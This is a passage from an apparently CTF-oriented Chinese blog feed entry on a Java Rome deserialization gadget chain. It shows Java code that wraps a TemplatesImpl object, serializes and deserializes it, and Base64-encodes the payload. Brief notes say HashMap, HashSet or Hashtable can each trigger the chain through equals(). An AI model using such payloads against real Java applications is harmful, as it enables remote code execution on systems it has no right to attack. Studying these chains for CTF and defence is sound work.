class="string">&quot;_obj&quot;</span>, templatesImpl);</span><br><span class="line">            unSerial(table);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ByteArrayOutputStream <span class="title function_">unSerial</span><span class="params">(Object hashMap)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bs);</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bs.toByteArray()));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> bs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这边其实HashMap，HashSet、HashTable都是可以用来替换的（最后序列化的东西）只要调用equals就可以触发接下来的链子拉<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682477287698-e0077ec5-f01a-42a2-8670-848c3ac21532.png#averageHue=%232d2f2d&clientId=u39004d1e-e146-4&from=paste&height=781&id=u90ed8559&name=image.png&originHeight=976&originWidth=1812&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2458187&status=done&style=none&taskId=u6340b831-9cab-4a4c-bce1-7f644ae784a&title=&width=1449.6" alt="image.png"><br>HashMap调用了equals，跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682477306477-053417ec-fb55-4fc3-9992-0c5232b4da4a.png#averageHue=%232a2c2b&clientId=u39004d1e-e146-4&from=paste&height=500&id=u8b2a1df5&name=image.png&originHeight=625&originWidth=1704&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1467506&status=done&style=none&taskId=ud49d33ce-325b-4922-a307-06d631be1f9&title=&width=1363.2" alt="image.png"><br>同样也是调用了equals最终获取getter<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682477372332-1ac1b083-35eb-4570-abdf-ca02cbcb7c1b.png#averageHue=%232b2c28&clientId=u39004d1e-e146-4&from=paste&height=430&id=ubaf13753&name=image.png&originHeight=537&originWidth=1389&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1036280&status=done&style=none&taskId=uce1e9aa0-15d7-425b-b5bb-cefec54455f&title=&width=1111.2" alt="image.png"></p><p>然后HashSet和HashTable调用也是这样，换汤不换药的</p>]]></content>
    
    
    <summary type="html">狗血的Java</summary>
    
    
    
    <category term="At Dawn" scheme="http://boogipop.com/categories/At-Dawn/"/>
    
    
    <category term="Java" scheme="http://boogipop.com/tags/Java/"/>
    
    <category term="CTF" scheme="http://boogipop.com/tags/CTF/"/>
    
    <category term="Rome" scheme="http://boogipop.com/tags/Rome/"/>
    
  </entry>
  
</feed>
